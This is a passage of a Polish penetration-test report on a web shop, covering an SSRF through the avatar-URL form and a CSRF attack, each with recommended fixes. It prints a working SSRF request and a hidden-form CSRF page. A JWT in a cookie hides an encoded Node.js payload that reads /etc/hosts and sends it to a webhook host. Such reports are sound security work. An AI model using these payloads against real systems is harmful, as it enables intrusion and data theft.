\subsection{\colorbox{orange!80}{\parbox{\textwidth}{PT16-SSRF: Atak Server Side Request Forgery}}}
\subsubsection{Opis}
Atak polegał na sprowokowaniu serwera do wysłania żądania GET na wybrany adres poprzez podanie linku w formularzu zmiany awatara.

\subsubsection{Warunki wykonania ataku}
Atakujący musi posiadać dowolny poprawny token.

\subsubsection{Szczegóły wykonania}
Atak został zrealizowany poprzez zapytanie zawarte w tabeli. W podanym przykładzie celem był adres zawierający się w sieci wewnętrznej kontenerów, do której należy host aplikacji (wiedza o tym pochodzi z ataku RCE).
\begin{table}[H]
\begin{tabular}{|l|l|l|l|l|l|}
\hline
\rowcolor[HTML]{EFEFEF} 
\multicolumn{1}{|c|}{\cellcolor[HTML]{EFEFEF}\textbf{Metoda}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Końcówka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Nagłowki}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Ciasteczka}} & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Dane}}                             & \multicolumn{1}{c|}{\cellcolor[HTML]{EFEFEF}\textbf{Odpowiedź/wynik}} \\ \hline
POST                                                          & /profile/image/url                                        & \begin{tabular}[c]{@{}l@{}}Authentication \\ Bearer TOKEN \end{tabular} & \begin{tabular}[c]{@{}l@{}}token: \\ TOKEN\end{tabular}   & \begin{tabular}[c]{@{}l@{}}\{"imageUrl":"http://169.254.1.2"\}\end{tabular} & 302 /profile                               \\ \hline
\end{tabular}
\end{table}

\subsubsection{Skutki}
Wynik zapytania (id 22 uzyskane na podstawie śledzenia pakietów w Burp) można podejrzeć wykorzystując proste żądanie GET:
\begin{lstlisting}
GET /assets/public/images/uploads/22.jpg
\end{lstlisting}
Wynik zapytania SSRF:
\begin{lstlisting}
<!doctype html>
<html>
  <head>
    <meta charset='utf-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1'>
    <title>Test Page for the HTTP Server on Fedora</title>
    <style type="text/css">
      /*<![CDATA[*/
      [...]
\end{lstlisting}

Ten przykład jest niegroźny, ale nie jest ciężko sobie wyobrazić, że bardziej doświadczony atakujący mógłby wykorzystać program automatycznie przeszukujący sieć i w ten sposób wykorzystać SSRF do \textbf{wyszukania kolejnych potencjalnych węzłów do ataku}.

Ta metoda ataku została również użyta do wysłania żądania na webhook. Czynność powiodła się bez problemu, co daje atakującemu \textbf{możliwość użycia sklepu do wykonywania podejrzanych połączeń} i np. dodatkowego ukrycia się przy rekonesansie zupełnie niepowiązanych serwisów (mógłby wykonać rekonesans jako sklep używając SSRF, a następnie usunąć historię swoich połączeń ze sklepem przez znalezione wcześniej RCE zacierając swoje ślady)

\subsubsection{Zalecenia}
Zabezpieczenie przed atakiem SSRF jest tutaj bardzo trudne, co wynika z samego charakteru dostarczanej użytkownikowi funkcji. Pierwszą sugestią było by dodanie walidacji URL poszerzonej o wyrażenie regularne sprawdzające, czy poprawny link na pewno odnosi się do obrazka o określonych rozszerzeniach (trzeba by tu było również pamiętać o Null Byte Poisoning!).

Inną pomocną czynnością było by zablokowanie użytkownikowi reprezentującemu serwer w systemie kontenera zapytań do sieci niepublicznych.

Prawdopodobnie najbezpieczniejszym rozwiązaniem jest całkowite usunięcie funkcji zmiany awatara przez link. Taka funkcja nie jest czymś kluczowym dla serwisu, a jeśli komuś bardzo zależy na swoim profilu to mógłby pobrać obrazek i wgrać go ręcznie w mniej niż minutę

\subsection{\colorbox{orange!80}{\parbox{\textwidth}{PT17-CSRF: Atak Cross-Site Request Forgery}}}

\subsubsection{Opis}
Atak CSRF polegał na implementacji formularza, potajemnie wysyłającego żądanie zmiany awatara, w niepowiązanym ze sklepem serwisie. Do testów użyta została strona internetowa htmledit.squarefree.com/.

Atak CSRF w trakcie testów nie powiódł się. Z drugiej strony analiza żądań oraz przegląd opinii innych testerów w internecie wskazuje na to, że powodem niepowodzenia były wbudowane zabezpieczenia nowoczesnych przeglądarek, a nie aplikacji sklepowej. Dowodem na to jest powodzenie ataku po ręcznym doklejeniu ciasteczek mimo obecności nagłówków typu Sec-Fetch-Site: cross-site jasno ostrzegających o możliwym CSRF. Można więc powiedzieć, że mimo niepowodzenia aplikacja posiada podatność na ten atak.

\subsubsection{Warunki wykonania ataku}
Atakujący musi posiadać dostęp do innego serwisu, gdzie może edytować kod formularzy. Użytkownik musi skorzystać z tego serwisu. Przeglądarka użytkownika musi być na tyle przestarzała, by pozwolić na wykonanie ataku.

\subsubsection{Szczegóły wykonania}
Kod formularza użytego w serwisie zewnętrznym, którego celem była zmiana pseudonimu:
\begin{lstlisting}
<html>
	<body>
		<form method="POST" action="https://adoringcohen.acme.edu.pl/profile">
			<input type="hidden" name="username" value="im_a_victim"/>
			<input type="submit" value="Submit">
		</form>
	</body>
<html>
\end{lstlisting}

Wypełnienie formularza skutkowało wysłaniem następującego żądania:
\begin{lstlisting}
POST /profile HTTP/2
Host: adoringcohen.acme.edu.pl
Content-Length: 20
Cache-Control: max-age=0
Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: pl-PL,pl;q=0.9
Origin: https://htmledit.squarefree.com
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: frame
Sec-Fetch-Storage-Access: active
Referer: https://htmledit.squarefree.com/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=im_a_victim
\end{lstlisting}
Jak pokazuje analiza żądania w BurpSuite użyta przeglądarka nie dokleiła ciasteczek, mimo że użytkownik był aktualnie zalogowany w sklepie.

Ręczne dodanie ciasteczek do tego samego żądania (wykorzystując dane z innych prostych przykładów) pozwoliło na zmianę pseudonimu.

Żądanie, które zmieniało pseudonim (pozostałe elementy/nagłówki były identyczne jak w powyższym, atak wykonywany był przez BurpSuite):
\begin{lstlisting}
[...]
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=xkV4XwOjLlQmrd8Btoi3t4fzt1TyWuY3HKaheVtazU3WFJ906gBbWaERzZMy; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiI3
tyZXF1aXJlKCdodHRwcycpLmdldCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvM2Y0MDZmMjItNzc
5ZS00NGEzLWE3Y2UtMDVlOTE0NmFhMDA5P2RhdGE9JyArIGVuY29kZVVSSUNvbXBvbmVudChy
ZXF1aXJlKCdmcycpLnJlYWRGaWxlU3luYygnL2V0Yy9ob3N0cycsICd1dGY4JykpKTt9IiwiZ
W1haWwiOiJmaWxpcEBtYWlsLmNvbSIsInBhc3N3b3JkIjoiYmE2Y2RhYTUzZGVkNDQyODU5Nj
MwMTRjODNkY2NhY2ZlOWUwNmU5YjQzODc2M2JjNGJhMWEyMzgzM2VkZDQ3NyIsInJvbGUiOiJ
jdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMC40Mi4xMi4xMDQi
LCJwcm9maWxlSW1hZ2UiOiJodHRwczovL2Fkb3Jpbmdjb2hlbi5hY21lLmVkdS5wbC9hc3Nld
HMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsIml
zQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI1LTA1LTE2VDEwOjM4OjQyLjMwMloiLCJ1c
GRhdGVkQXQiOiIyMDI1LTA1LTE2VDE1OjA3OjExLjcwMloiLCJkZWxldGVkQXQiOm51bGx9LCJ
pYXQiOjE3NDc0MDgwMzJ9.d8jrsNnP1HZ-3WV
BciASup17-BwDyl103JYoP56G79iwEdWTppUx-uXo29QmaHZn2bt9dAaiuNwUf5YAu6hcgDVeJ
iDAynukLo1MHIpJpKbn5f2sHdSrtGh9-qgw3un0oof8TQ6Syh0WConNjwhfwUs5GVT9nao3O4260w6QEzs
[...]
\end{lstlisting}

\subsubsection{Skutki}
Atakujący ma \textbf{możliwość wykonywania dowolnych akcji w imieniu użytkownika}.

\subsubsection{Zalecenia}
Istnieje kilka metod zabezpieczeń przed CSRF:
\begin{itemize}
  \item Wykorzystanie stanu przy ważniejszych formularzach:
  
  Serwer wysyłając formularz dodaje do niego ukryte pole z losowym stanem, który zapamiętuje. Jeśli odpowiedź na formularz zawiera ten sam stan to odpowiedź jest akceptowana, jeśli nie to ignoruje. Wtedy żądanie z ataku CSRF nie znając stanu nie może nic zmienić.
  \item Ciasteczka SameSite
  
  Odpowiednie ustawienie ciasteczek sprawia, że zostaną one doklejone tylko do zapytań pochodzących z tej samej domeny. Aktualnie wiele przeglądarek wymusza takie ustawienia jako domyślne, co jest powodem niepowodzenia ataku w przeprowadzonych badaniach.
\end{itemize}
Aby zagwarantować bezpieczeństwo również dla użytkowników ze starszymi wersjami przeglądarek warto zaimplementować kilka poprawek przynajmniej dla najważniejszych formularzy w aplikacji. Informacje o ataku i poprawkach zostały oparte głównie o źródło \href{https://portswigger.net/web-security/csrf\#common-defences-against-csrf}{https://portswigger.net/web-security/csrf\#common-defences-against-csrf}
  
